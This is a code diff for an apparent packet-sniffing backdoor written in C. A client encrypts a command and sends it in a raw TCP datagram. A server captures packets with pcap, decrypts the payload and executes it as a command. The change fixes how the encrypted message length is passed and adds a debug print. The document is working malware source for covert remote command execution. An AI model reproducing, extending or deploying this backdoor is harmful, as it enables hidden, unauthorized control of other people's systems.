@@ -121,7 +121,8 @@ void client(struct client_opt c_opt){
     /* Encrypt command */
     
     char *bd_message;
-    bd_message = bd_encrypt(c_opt.command);
+    int bd_message_len;
+    bd_message = bd_encrypt(c_opt.command, &bd_message_len);
     
     /* Set packet options and send packet */
     
@@ -139,7 +140,7 @@ void client(struct client_opt c_opt){
         system_fatal("setsockopt");
     
     // Send packet
-    send_datagram(&user_addr, bd_message);
+    send_datagram(&user_addr, bd_message, bd_message_len);
     
     /* Receive reply and print */
     
@@ -258,7 +259,7 @@ void server(struct server_opt s_opt){
 | ------------------------------------------------------------------------------
 */
 
-int send_datagram(struct addr_info *user_addr, char *data){
+int send_datagram(struct addr_info *user_addr, char *data, int data_len){
     
     /* Declare variables */
     
@@ -274,7 +275,6 @@ int send_datagram(struct addr_info *user_addr, char *data){
     sin.sin_addr.s_addr = inet_addr(user_addr->dhost);
     
     pseudo_header psh;
-    int data_len = strlen(data);
     
     // Zero out the buffer where the datagram will be stored
     memset(datagram, 0, PKT_SIZE);
@@ -372,9 +372,10 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     
     /* Decrypt remaining packet data */
     
-    int data_len = packet_info.ip->ip_len - sizeof(struct iphdr) - sizeof(struct tcphdr);
+    int payload_len = packet_info.ip->ip_len - sizeof(struct iphdr) - sizeof(struct tcphdr);
+    printf("payload_len: %d\n",payload_len);
     char *bd_command;
-    bd_command = bd_decrypt((char *)packet_info.payload, data_len);
+    bd_command = bd_decrypt((char *)packet_info.payload, payload_len);
     
     // Execute command
     FILE *fp;
